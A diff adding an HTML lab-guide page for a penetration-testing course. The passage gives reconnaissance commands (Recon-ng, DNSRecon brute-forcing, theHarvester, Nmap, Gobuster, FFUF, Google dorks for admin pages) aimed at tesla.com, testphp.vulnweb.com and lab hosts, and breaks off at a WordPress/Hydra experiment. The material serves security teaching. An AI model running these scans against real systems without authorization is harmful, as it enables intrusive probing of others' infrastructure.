@@ -1,0 +1,1678 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="text-scale" content="scale" />
+  <meta name="theme-color" content="#0b1016" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <title>s7@arxec-lab — Mobile Terminal Reader</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg-canvas: #090d12;
+      --bg-surface: #0f161f;
+      --bg-elevated: #151f2b;
+      --bg-code: #070b0f;
+      --fg-primary: #e6edf5;
+      --fg-secondary: #9fb1c6;
+      --fg-muted: #6c8096;
+      --accent-green: #3fb950;
+      --accent-cyan: #58a6ff;
+      --accent-amber: #d29922;
+      --accent-danger: #f85149;
+      --border-subtle: #1f2d3d;
+      --border-focus: #58a6ff;
+      --selection-bg: rgba(88, 166, 255, 0.28);
+      --shadow-elevated: 0 8px 24px rgba(2, 6, 12, 0.55);
+      --user-scale: 1;
+      --font-sans: "Plus Jakarta Sans", -apple-system, BlinkMacSystemFont, sans-serif;
+      --font-mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+
+    html[data-theme="light"] {
+      --bg-canvas: #f4f7fa;
+      --bg-surface: #ffffff;
+      --bg-elevated: #eaf0f6;
+      --bg-code: #0f1720;
+      --fg-primary: #0d1824;
+      --fg-secondary: #384b61;
+      --fg-muted: #5c7087;
+      --accent-green: #16792b;
+      --accent-cyan: #0550ae;
+      --accent-amber: #9a6700;
+      --accent-danger: #cf222e;
+      --border-subtle: #d0dbe7;
+      --border-focus: #0550ae;
+      --selection-bg: rgba(5, 80, 174, 0.18);
+      --shadow-elevated: 0 6px 20px rgba(13, 24, 36, 0.08);
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    ::selection {
+      background: var(--selection-bg);
+      color: var(--fg-primary);
+    }
+
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: var(--bg-canvas);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: var(--border-subtle);
+      border-radius: 3px;
+    }
+
+    body {
+      background-color: var(--bg-canvas);
+      color: var(--fg-primary);
+      font-family: var(--font-sans);
+      line-height: 1.55;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      caret-color: var(--accent-green);
+      font-variant-numeric: tabular-nums;
+      -webkit-tap-highlight-color: transparent;
+      overflow-x: hidden;
+    }
+
+    :focus-visible {
+      outline: 2px solid var(--border-focus);
+      outline-offset: 2px;
+    }
+
+    /* Top Sticky Terminal Bar */
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 30;
+      background-color: var(--bg-surface);
+      border-bottom: 1px solid var(--border-subtle);
+    }
+
+    .topbar-inner {
+      max-width: 56rem;
+      margin: 0 auto;
+      padding: 0.65rem 0.9rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.5rem;
+    }
+
+    .prompt-brand {
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--accent-green);
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .prompt-brand .path {
+      color: var(--accent-cyan);
+    }
+
+    .top-controls {
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+      flex-shrink: 0;
+    }
+
+    .icon-btn {
+      background: var(--bg-elevated);
+      color: var(--fg-primary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.4rem;
+      padding: 0.35rem 0.55rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.25rem;
+      min-height: 2.1rem;
+      transition: background-color 0.15s ease, border-color 0.15s ease;
+    }
+
+    .icon-btn:hover, .icon-btn:active {
+      border-color: var(--accent-cyan);
+    }
+
+    .icon-btn svg {
+      width: 0.95rem;
+      height: 0.95rem;
+      stroke: currentColor;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    /* Horizontal Experiment Strip */
+    .exp-strip-wrap {
+      background: var(--bg-canvas);
+      border-bottom: 1px solid var(--border-subtle);
+    }
+
+    .exp-strip {
+      max-width: 56rem;
+      margin: 0 auto;
+      padding: 0.5rem 0.75rem;
+      display: flex;
+      gap: 0.4rem;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+    .exp-strip::-webkit-scrollbar {
+      display: none;
+    }
+
+    .exp-pill {
+      background: var(--bg-surface);
+      color: var(--fg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.45rem;
+      padding: 0.4rem 0.7rem;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 500;
+      white-space: nowrap;
+      cursor: pointer;
+      flex-shrink: 0;
+      min-height: 2.25rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      transition: background-color 0.15s ease, color 0.15s ease, border-color 0.15s ease;
+    }
+
+    .exp-pill .num {
+      color: var(--accent-cyan);
+      font-weight: 700;
+    }
+
+    .exp-pill[aria-pressed="true"] {
+      background: var(--bg-elevated);
+      color: var(--fg-primary);
+      border-color: var(--accent-cyan);
+      font-weight: 600;
+    }
+
+    /* Mode Switcher Bar */
+    .mode-bar {
+      max-width: 56rem;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0.55rem 0.75rem 0.2rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.4rem;
+    }
+
+    .mode-btn {
+      flex: 1 1 auto;
+      background: var(--bg-surface);
+      color: var(--fg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.45rem;
+      padding: 0.45rem 0.65rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.35rem;
+      min-height: 2.3rem;
+    }
+
+    .mode-btn[aria-selected="true"] {
+      background: var(--accent-cyan);
+      color: #060a0f;
+      border-color: var(--accent-cyan);
+    }
+
+    html[data-theme="light"] .mode-btn[aria-selected="true"] {
+      color: #ffffff;
+    }
+
+    /* Main Terminal Viewport */
+    .terminal-main {
+      container-type: inline-size;
+      max-width: 56rem;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0.75rem 0.85rem 5.5rem;
+      flex: 1;
+      font-size: calc(1rem * var(--user-scale));
+    }
+
+    .exp-header {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.6rem;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      box-shadow: var(--shadow-elevated);
+    }
+
+    .exp-title {
+      font-size: clamp(1.15rem, 1rem + 1.2vw, 1.5rem);
+      font-weight: 700;
+      line-height: 1.3;
+      color: var(--fg-primary);
+      letter-spacing: -0.02em;
+      text-wrap: balance;
+      margin-bottom: 0.55rem;
+    }
+
+    .exp-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.45rem 0.9rem;
+      font-family: var(--font-mono);
+      font-size: 0.82em;
+      color: var(--fg-secondary);
+      margin-bottom: 0.6rem;
+    }
+
+    .exp-meta strong {
+      color: var(--accent-amber);
+      font-weight: 600;
+    }
+
+    .exp-aim {
+      font-size: 0.94em;
+      color: var(--fg-secondary);
+      max-width: 68ch;
+    }
+
+    /* Step Sections */
+    .step-list {
+      display: flex;
+      flex-direction: column;
+      gap: 0.85rem;
+    }
+
+    .step-block {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.6rem;
+      padding: 0.95rem;
+    }
+
+    .step-heading {
+      font-family: var(--font-mono);
+      font-size: 0.95em;
+      font-weight: 700;
+      color: var(--accent-cyan);
+      margin-bottom: 0.45rem;
+    }
+
+    .step-desc {
+      font-size: 0.92em;
+      color: var(--fg-secondary);
+      margin-bottom: 0.65rem;
+      max-width: 68ch;
+    }
+
+    .step-notes {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+      margin-bottom: 0.65rem;
+      font-size: 0.9em;
+      color: var(--fg-primary);
+    }
+
+    .step-notes li {
+      position: relative;
+      padding-left: 1rem;
+      max-width: 68ch;
+    }
+
+    .step-notes li::before {
+      content: "›";
+      position: absolute;
+      left: 0;
+      color: var(--accent-amber);
+      font-family: var(--font-mono);
+      font-weight: 700;
+    }
+
+    /* Command Block with One-Tap Copy */
+    .cmd-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .cmd-box {
+      background: var(--bg-code);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.45rem;
+      padding: 0.6rem 0.7rem;
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 0.6rem;
+    }
+
+    .cmd-code {
+      font-family: var(--font-mono);
+      font-size: 0.86em;
+      line-height: 1.5;
+      color: #4ae168;
+      word-break: break-word;
+      white-space: pre-wrap;
+      flex: 1;
+    }
+
+    .cmd-code .comment {
+      color: #7d92a8;
+      display: block;
+    }
+
+    .copy-btn {
+      background: rgba(255, 255, 255, 0.07);
+      color: #c9d6e3;
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-radius: 0.35rem;
+      padding: 0.28rem 0.55rem;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      font-weight: 600;
+      cursor: pointer;
+      flex-shrink: 0;
+      min-height: 1.85rem;
+    }
+
+    .copy-btn[data-copied="true"] {
+      background: rgba(63, 185, 80, 0.22);
+      color: #56f070;
+      border-color: #3fb950;
+    }
+
+    /* Observations Footer inside Experiment */
+    .obs-box {
+      margin-top: 0.9rem;
+      background: var(--bg-elevated);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.55rem;
+      padding: 0.85rem 0.95rem;
+    }
+
+    .obs-title {
+      font-family: var(--font-mono);
+      font-size: 0.85em;
+      font-weight: 700;
+      color: var(--accent-amber);
+      margin-bottom: 0.4rem;
+    }
+
+    /* Prev / Next Navigation Buttons */
+    .pager-row {
+      margin-top: 1.15rem;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.6rem;
+    }
+
+    .pager-btn {
+      background: var(--bg-surface);
+      color: var(--fg-primary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.5rem;
+      padding: 0.75rem 0.85rem;
+      font-family: var(--font-mono);
+      font-size: 0.84rem;
+      font-weight: 600;
+      cursor: pointer;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      gap: 0.15rem;
+      min-height: 3.2rem;
+    }
+
+    .pager-btn.next {
+      text-align: right;
+      align-items: flex-end;
+    }
+
+    .pager-btn span.sub {
+      font-size: 0.72rem;
+      color: var(--fg-secondary);
+      font-weight: 400;
+    }
+
+    /* Search & AI Panes */
+    .pane-box {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.6rem;
+      padding: 1rem;
+      box-shadow: var(--shadow-elevated);
+    }
+
+    .input-row {
+      display: flex;
+      gap: 0.5rem;
+      margin-bottom: 0.9rem;
+    }
+
+    .term-input {
+      flex: 1;
+      background: var(--bg-canvas);
+      color: var(--fg-primary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.45rem;
+      padding: 0.65rem 0.8rem;
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      min-height: 2.65rem;
+    }
+
+    .action-btn {
+      background: var(--accent-cyan);
+      color: #060a0f;
+      border: none;
+      border-radius: 0.45rem;
+      padding: 0 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      font-weight: 700;
+      cursor: pointer;
+      min-height: 2.65rem;
+    }
+
+    html[data-theme="light"] .action-btn {
+      color: #ffffff;
+    }
+
+    .chat-log {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+      margin-top: 0.75rem;
+    }
+
+    .chat-msg {
+      padding: 0.75rem 0.9rem;
+      border-radius: 0.5rem;
+      border: 1px solid var(--border-subtle);
+      font-size: 0.92em;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .chat-msg.user {
+      background: var(--bg-elevated);
+      font-family: var(--font-mono);
+      color: var(--accent-cyan);
+    }
+
+    .chat-msg.bot {
+      background: var(--bg-canvas);
+      font-family: var(--font-mono);
+      color: var(--fg-primary);
+    }
+
+    /* Sticky Bottom Command Bar */
+    .bottom-cmd-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      z-index: 40;
+      background: var(--bg-surface);
+      border-top: 1px solid var(--border-subtle);
+      padding: 0.45rem 0.75rem calc(0.45rem + env(safe-area-inset-bottom, 0px));
+    }
+
+    .bottom-cmd-inner {
+      max-width: 56rem;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+    }
+
+    .cmd-prompt-label {
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--accent-green);
+      white-space: nowrap;
+    }
+
+    .cmd-bar-input {
+      flex: 1;
+      background: var(--bg-canvas);
+      color: var(--fg-primary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.4rem;
+      padding: 0.45rem 0.65rem;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      min-height: 2.25rem;
+    }
+
+    .cmd-run-btn {
+      background: var(--bg-elevated);
+      color: var(--accent-green);
+      border: 1px solid var(--border-subtle);
+      border-radius: 0.4rem;
+      padding: 0.45rem 0.75rem;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 700;
+      cursor: pointer;
+      min-height: 2.25rem;
+    }
+
+    @container (min-width: 42em) {
+      .exp-header {
+        padding: 1.25rem 1.4rem;
+      }
+      .step-block {
+        padding: 1.15rem 1.3rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="topbar-inner">
+      <div class="prompt-brand" aria-label="Terminal status">
+        <span>s7@arxec</span><span class="path" id="promptPath">:~/exp1</span>
+      </div>
+      <div class="top-controls">
+        <button type="button" class="icon-btn" id="fontDownBtn" title="Decrease font size" aria-label="Decrease text size">A-</button>
+        <button type="button" class="icon-btn" id="fontUpBtn" title="Increase font size" aria-label="Increase text size">A+</button>
+        <button type="button" class="icon-btn" id="themeBtn" title="Toggle Daylight / Night mode" aria-label="Toggle color theme">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+          <span id="themeLabel">Day</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <nav class="exp-strip-wrap" aria-label="Experiments 1 to 8">
+    <div class="exp-strip" id="expStrip"></div>
+  </nav>
+
+  <div class="mode-bar" role="tablist" aria-label="View Modes">
+    <button type="button" role="tab" class="mode-btn" id="tabFull" aria-selected="true" data-mode="full">Full Guide</button>
+    <button type="button" role="tab" class="mode-btn" id="tabCmds" aria-selected="false" data-mode="cmds">Cmds Only (c)</button>
+    <button type="button" role="tab" class="mode-btn" id="tabSearch" aria-selected="false" data-mode="search">Search (s)</button>
+    <button type="button" role="tab" class="mode-btn" id="tabAi" aria-selected="false" data-mode="ai">Ask AI (ai)</button>
+    <button type="button" role="tab" class="mode-btn" id="tabCurl" aria-selected="false" data-mode="curl">curl Setup</button>
+  </div>
+
+  <main class="terminal-main" id="mainViewport"></main>
+
+  <form class="bottom-cmd-bar" id="cmdForm" autocomplete="off">
+    <div class="bottom-cmd-inner">
+      <label for="cmdInput" class="cmd-prompt-label" id="bottomPrompt">s7 (1)&gt;</label>
+      <input
+        type="text"
+        id="cmdInput"
+        class="cmd-bar-input"
+        placeholder="Type 1-8, c 5, s hydra, ai <question>, n, p..."
+        aria-label="Terminal command input"
+      />
+      <button type="submit" class="cmd-run-btn">Run</button>
+    </div>
+  </form>
+
+  <script>
+    const EXPERIMENTS = [
+      {
+        id: 1,
+        short: "Theory & Recon",
+        title: "Exp 1: Familiarization of Application Penetration Testing (Theory)",
+        aim: "Familiarize with application penetration testing concepts, passive and active reconnaissance tools, and ethical rules.",
+        target: "Web & Mobile Applications",
+        tools: "theHarvester, Maltego, Recon-ng, Shodan, Nmap, Burp Suite, Nikto, DirBuster",
+        steps: [
+          {
+            heading: "1. Application Penetration Testing",
+            desc: "Simulating real-world attacks on web or mobile applications to identify security weaknesses before malicious hackers exploit them.",
+            notes: [
+              "Checks for insecure coding, misconfigurations, authentication flaws, and sensitive data leaks.",
+              "Protects user data, backend systems, and compliance with security standards."
+            ],
+            cmds: []
+          },
+          {
+            heading: "2. Reconnaissance Phases & Tools",
+            desc: "The information-gathering phase to map the target surface and discover entry points:",
+            notes: [
+              "Passive Reconnaissance (no direct interaction with target): WHOIS lookups, search engines, Shodan, breach databases, social media.",
+              "Passive Tools: theHarvester, Maltego, Recon-ng, Shodan",
+              "Active Reconnaissance (direct engagement with target): Scanning open ports, mapping hidden directories, fingerprinting services.",
+              "Active Tools: Nmap, Burp Suite, Nikto, DirBuster, Gobuster, FFUF"
+            ],
+            cmds: []
+          },
+          {
+            heading: "3. Ethical Considerations",
+            desc: "Mandatory rules for conducting authorized security testing:",
+            notes: [
+              "Always obtain written authorization from the application owner before testing.",
+              "Strictly follow the agreed scope; avoid actions causing data loss or service disruption.",
+              "Report all discovered vulnerabilities responsibly."
+            ],
+            cmds: []
+          }
+        ],
+        cmdsOnly: [
+          "# Exp 1 is a Theory Experiment — Reference Tool Summary:",
+          "# Passive Recon Tools: theHarvester, Maltego, Recon-ng, Shodan",
+          "# Active Recon Tools:  Nmap, Burp Suite, Nikto, DirBuster, Gobuster, FFUF"
+        ],
+        observations: [
+          "Understood the distinction between passive (non-intrusive) and active (direct probing) reconnaissance.",
+          "Identified key OSINT and scanning tools alongside legal and ethical boundaries."
+        ]
+      },
+      {
+        id: 2,
+        short: "Recon-ng (P1)",
+        title: "Exp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng",
+        aim: "Gather publicly available OSINT about a live domain (tesla.com) using Recon-ng modules: subdomain discovery, WHOIS contact extraction, brute-force discovery, and Bing search.",
+        target: "tesla.com",
+        tools: "Recon-ng (Kali / Ubuntu Linux)",
+        steps: [
+          {
+            heading: "Step 1: Install & Launch Recon-ng",
+            desc: "Install Recon-ng from APT (or clone from GitHub if unavailable in your Ubuntu repository):",
+            notes: [],
+            cmds: [
+              "sudo apt update && sudo apt install -y recon-ng",
+              "recon-ng",
+              "# Fallback if APT package is missing:\ngit clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS && ./recon-ng"
+            ]
+          },
+          {
+            heading: "Step 2: Create & Select a Workspace",
+            desc: "Workspaces isolate reconnaissance tables for each target engagement:",
+            notes: [],
+            cmds: [
+              "workspaces create testspace",
+              "workspaces select testspace"
+            ]
+          },
+          {
+            heading: "Step 3: Search & Install Required Modules",
+            desc: "Install the 4 marketplace modules required for subdomain and WHOIS enumeration:",
+            notes: [],
+            cmds: [
+              "marketplace search",
+              "marketplace install recon/domains-hosts/hackertarget",
+              "marketplace install recon/domains-contacts/whois_pocs",
+              "marketplace install recon/domains-hosts/brute_hosts",
+              "marketplace install recon/domains-hosts/bing_domain_web"
+            ]
+          },
+          {
+            heading: "Step 4: Subdomain Discovery via HackerTarget",
+            desc: "Enumerates subdomains using HackerTarget's public DNS dataset:",
+            notes: [],
+            cmds: [
+              "modules load recon/domains-hosts/hackertarget\noptions set SOURCE tesla.com\nrun"
+            ]
+          },
+          {
+            heading: "Step 5: WHOIS Point of Contact (PoC) Extraction",
+            desc: "Extracts public administrative and technical contact emails from WHOIS records:",
+            notes: [],
+            cmds: [
+              "modules load recon/domains-contacts/whois_pocs\noptions set SOURCE tesla.com\nrun"
+            ]
+          },
+          {
+            heading: "Step 6: Brute-Force Subdomain Discovery",
+            desc: "Brute-forces common and predictable subdomain hostnames:",
+            notes: [],
+            cmds: [
+              "modules load recon/domains-hosts/brute_hosts\noptions set SOURCE tesla.com\nrun"
+            ]
+          },
+          {
+            heading: "Step 7: Subdomain Discovery via Bing Search",
+            desc: "Queries Bing for indexed subdomains of tesla.com and displays collected records:",
+            notes: [],
+            cmds: [
+              "modules load recon/domains-hosts/bing_domain_web\noptions set SOURCE tesla.com\nrun",
+              "show hosts\nshow contacts"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "sudo apt update && sudo apt install -y recon-ng && recon-ng",
+          "workspaces create testspace\nworkspaces select testspace",
+          "marketplace search\nmarketplace install recon/domains-hosts/hackertarget\nmarketplace install recon/domains-contacts/whois_pocs\nmarketplace install recon/domains-hosts/brute_hosts\nmarketplace install recon/domains-hosts/bing_domain_web",
+          "modules load recon/domains-hosts/hackertarget\noptions set SOURCE tesla.com\nrun",
+          "modules load recon/domains-contacts/whois_pocs\noptions set SOURCE tesla.com\nrun",
+          "modules load recon/domains-hosts/brute_hosts\noptions set SOURCE tesla.com\nrun",
+          "modules load recon/domains-hosts/bing_domain_web\noptions set SOURCE tesla.com\nrun\nshow hosts\nshow contacts"
+        ],
+        observations: [
+          "hackertarget and bing_domain_web revealed multiple public subdomains of tesla.com.",
+          "whois_pocs extracted WHOIS Point of Contact administrative and technical email addresses.",
+          "brute_hosts discovered common subdomains through dictionary enumeration."
+        ]
+      },
+      {
+        id: 3,
+        short: "Nmap & Gobuster (P2)",
+        title: "Exp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)",
+        aim: "Perform passive and active reconnaissance to identify live hosts, open ports, running services, OS versions, and hidden web directories.",
+        target: "testphp.vulnweb.com / <Lab-Target-IP>",
+        tools: "Maltego, Nmap, Gobuster, FFUF, curl",
+        steps: [
+          {
+            heading: "Step 0: Ubuntu Tool & Wordlist Setup",
+            desc: "Install Nmap, Gobuster, FFUF, and download the dirb common.txt wordlist if missing:",
+            notes: [],
+            cmds: [
+              "sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl",
+              "sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt"
+            ]
+          },
+          {
+            heading: "Step 1: Passive Reconnaissance using Maltego",
+            desc: "Map external domain entities, DNS records, IP ranges, and emails without touching the target:",
+            notes: [
+              "Launch Maltego in terminal and log in to your account.",
+              "Navigate to Machines > Run Machine -> Choose 'Footprint L1'.",
+              "Enter domain: testphp.vulnweb.com and inspect the entity graph."
+            ],
+            cmds: ["maltego"]
+          },
+          {
+            heading: "Step 2: Active Reconnaissance & Scanning using Nmap",
+            desc: "Discover live hosts, open ports, service versions, and OS fingerprints:",
+            notes: [
+              "-sn : Ping scan (host discovery only) | -sV : Service version detection",
+              "-p  : Specific ports | -p- : Scan all 65535 ports",
+              "-A  : Aggressive scan (OS + version + default scripts + traceroute)",
+              "-Pn : Treat host as online (skip ping) | -T4 : Faster timing | -O : OS detection | -F : Fast scan (top 100 ports)"
+            ],
+            cmds: [
+              "sudo nmap -sn <Target-IP>/24",
+              "sudo nmap -sV -O -p- -A -T4 <TARGET-IP>",
+              "sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com",
+              "sudo nmap -F testphp.vulnweb.com"
+            ]
+          },
+          {
+            heading: "Step 3: Web Directory Enumeration with Gobuster",
+            desc: "Brute-force hidden directories and files (e.g., /admin, /images, /uploads) using common.txt:",
+            notes: [],
+            cmds: [
+              "gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt",
+              "gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt"
+            ]
+          },
+          {
+            heading: "Step 4: Alternative Directory Enumeration using FFUF",
+            desc: "Fuzzes the FUZZ keyword in the URL against every line in common.txt:",
+            notes: [],
+            cmds: [
+              "ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl",
+          "sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt",
+          "maltego",
+          "sudo nmap -sn <Target-IP>/24",
+          "sudo nmap -sV -O -p- -A -T4 <TARGET-IP>",
+          "sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com",
+          "sudo nmap -F testphp.vulnweb.com",
+          "gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt",
+          "ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+        ],
+        observations: [
+          "Maltego mapped external DNS, IP, and email relationships passively.",
+          "Nmap identified open ports (80/443), web server versions, and OS fingerprints.",
+          "Gobuster and FFUF uncovered unlinked directories such as /admin, /images, and /CVS."
+        ]
+      },
+      {
+        id: 4,
+        short: "DNS & Dorks (P3)",
+        title: "Exp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure",
+        aim: "Profile web infrastructure components (subdomains, emails, DNS/MX records, and login portals) using DNSRecon, theHarvester, Dig, and Google Dorking.",
+        target: "tesla.com / testphp.vulnweb.com",
+        tools: "DNSRecon, theHarvester, Dig, Google Search Dorks",
+        steps: [
+          {
+            heading: "Step 0: Ubuntu Setup & SecLists Wordlist",
+            desc: "Install DNS utilities, DNSRecon, theHarvester, and fetch the top-5000 subdomains wordlist:",
+            notes: [],
+            cmds: [
+              "sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester",
+              "curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt"
+            ]
+          },
+          {
+            heading: "Step 1: DNS Enumeration using DNSRecon",
+            desc: "Enumerate DNS records and brute-force subdomains:",
+            notes: [
+              "NS (Name Server): Authoritative DNS servers",
+              "A (Address): IPv4 address of the domain",
+              "MX (Mail Exchange): Email server routing",
+              "SOA (Start of Authority): Domain admin & zone timing",
+              "TXT/SPF: Sender Policy Framework & verification records"
+            ],
+            cmds: [
+              "dnsrecon -d tesla.com",
+              "dnsrecon -d tesla.com -t std --xml tesla_dns.xml",
+              "dnsrecon -d tesla.com -t brt -D subdomains.txt"
+            ]
+          },
+          {
+            heading: "Step 2: Subdomain & Email Enumeration using theHarvester",
+            desc: "Collect subdomains (e.g., shop.tesla.com, energy.tesla.com) and public email addresses from Bing:",
+            notes: [
+              "Other supported search engines: bing, baidu, yahoo, crtsh, duckduckgo."
+            ],
+            cmds: [
+              "theHarvester -d tesla.com -b bing"
+            ]
+          },
+          {
+            heading: "Step 3: Manual DNS Record Queries using Dig",
+            desc: "Directly query A, authoritative Name Servers (NS), and Mail Exchange (MX) records:",
+            notes: [],
+            cmds: [
+              "dig tesla.com",
+              "dig +short NS tesla.com",
+              "dig +short MX tesla.com"
+            ]
+          },
+          {
+            heading: "Step 4: Discovering Login Interfaces using Google Dorking",
+            desc: "Use advanced search operators in Google to locate exposed admin panels and login forms:",
+            notes: [
+              "inurl: (keyword in URL) | intitle: (keyword in page title)",
+              "filetype: (specific file extension) | site: (restrict to domain) | intext: (keyword in body)"
+            ],
+            cmds: [
+              "inurl:admin site:tesla.com",
+              "intitle:\"login\" site:tesla.com",
+              "inurl:login site:testphp.vulnweb.com",
+              "filetype:php inurl:admin",
+              "site:github.com inurl:login"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester",
+          "curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt",
+          "dnsrecon -d tesla.com",
+          "dnsrecon -d tesla.com -t std --xml tesla_dns.xml",
+          "dnsrecon -d tesla.com -t brt -D subdomains.txt",
+          "theHarvester -d tesla.com -b bing",
+          "dig tesla.com\ndig +short NS tesla.com\ndig +short MX tesla.com",
+          "inurl:admin site:tesla.com\nintitle:\"login\" site:tesla.com\ninurl:login site:testphp.vulnweb.com\nfiletype:php inurl:admin\nsite:github.com inurl:login"
+        ],
+        observations: [
+          "Discovered subdomains (shop.tesla.com, energy.tesla.com) via theHarvester and confirmed them with DNSRecon.",
+          "Dig and DNSRecon mapped Tesla's authoritative NS and MX mail servers.",
+          "Google dorks revealed public login pages on testphp.vulnweb.com."
+        ]
+      },
+      {
+        id: 5,
+        short: "WPScan, ZAP & Hydra (P4)",
+        title: "Exp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra",
+        aim: "Identify known vulnerabilities, CVEs, misconfigurations, and weak login credentials in a WordPress application using WPScan, NVD, OWASP ZAP, and Hydra.",
+        target: "http://<target-ip> (WordPress VM)",
+        tools: "WPScan, OWASP ZAP, Hydra, NVD (https://nvd.nist.gov/)",
+        steps: [
+          {
+            heading: "Core Vulnerability Definitions (NVD, CVE, CWE)",
+            desc: "Key vulnerability classification standards used in this experiment:",
+            notes: [
